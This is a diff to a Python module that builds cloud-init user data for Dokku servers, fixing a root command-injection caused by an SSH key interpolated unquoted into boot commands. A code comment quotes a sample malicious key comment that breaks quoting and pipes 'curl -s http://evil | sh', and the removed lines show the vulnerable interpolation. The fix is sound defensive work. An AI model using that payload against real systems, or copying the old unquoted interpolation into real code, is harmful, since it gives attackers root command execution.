@@ -16,8 +16,31 @@
 # assumptions hold.
 #
 # Created 2026-07-22 (feat/ship-2-provisioning, SHIP-2): new module.
+# Updated 2026-07-29 (fix/ship-review-p0): closed a root command-injection at
+#   first boot. The key is interpolated inside single quotes into two root-level
+#   runcmd entries, and the old validator (non-empty, no newline, starts with
+#   ssh-/ecdsa-/sk-) permitted a quote in the comment — so a crafted key ran
+#   arbitrary commands as root. Now shape-validated against ``_SSH_PUBKEY_RE``
+#   AND shlex-quoted at both interpolation sites.
 
 from __future__ import annotations
+
+import re
+import shlex
+
+# An OpenSSH public key: ``<type> <base64>`` plus an OPTIONAL comment drawn from
+# a conservative charset. The previous check only asserted "non-empty, no
+# newline, starts with ssh-/ecdsa-/sk-", which let a quote through — and the key
+# is interpolated inside single quotes into two root-level boot commands, so a
+# comment like ``paw-ship-a'; curl -s http://evil | sh; echo '`` closed the
+# quoting and ran arbitrary commands as root during first boot. Both halves are
+# fixed: the shape is validated here AND every shell interpolation is
+# shlex-quoted below, so neither alone is load-bearing.
+_SSH_PUBKEY_RE = re.compile(
+    r"^(?:ssh-[a-z0-9-]+|ecdsa-[a-z0-9-]+|sk-[a-z0-9@.-]+)"  # key type
+    r"\s+[A-Za-z0-9+/=]+"  # base64 body
+    r"(?:\s+[A-Za-z0-9_@.\-]+)?$"  # optional comment, conservative charset
+)
 
 # Pinned so every box exposes the same Dokku control surface (the SHIP-1 driver
 # parses versioned output). Bump deliberately, in lockstep with the driver's
@@ -35,8 +58,11 @@ def render_user_data(*, ssh_public_key: str) -> str:
     would silently lock us out of the box).
     """
     key = ssh_public_key.strip()
-    if not key or "\n" in key or not key.startswith(("ssh-", "ecdsa-", "sk-")):
+    if not key or "\n" in key or not _SSH_PUBKEY_RE.match(key):
         raise ValueError("ssh_public_key must be a single-line OpenSSH public key")
+    # Quoted for the two shell commands below. The key has already been shape-
+    # validated, so this is defence in depth, not the only guard.
+    quoted_key = shlex.quote(key)
 
     # A #cloud-config document. runcmd order matters: Docker first (Dokku's
     # bootstrap needs it), then the pinned Dokku bootstrap, then nixpacks, then
@@ -46,7 +72,7 @@ def render_user_data(*, ssh_public_key: str) -> str:
     dokku_ssh_dir = "/home/dokku/.ssh"
     authorize_dokku = (
         f"mkdir -p {dokku_ssh_dir} && "
-        f"echo '{key}' >> {dokku_ssh_dir}/authorized_keys && "
+        f"echo {quoted_key} >> {dokku_ssh_dir}/authorized_keys && "
         f"chown -R dokku:dokku {dokku_ssh_dir} && "
         f"chmod 600 {dokku_ssh_dir}/authorized_keys"
     )
@@ -74,5 +100,5 @@ runcmd:
   - [ sh, -c, "dokku plugin:install https://github.com/dokku/dokku-mongo.git mongo" ]
   - [ sh, -c, "dokku plugin:install https://github.com/dokku/dokku-letsencrypt.git letsencrypt" ]
   - [ sh, -c, "{authorize_dokku}" ]
-  - [ sh, -c, "echo '{key}' | dokku ssh-keys:add admin" ]
+  - [ sh, -c, "echo {quoted_key} | dokku ssh-keys:add admin" ]
 """
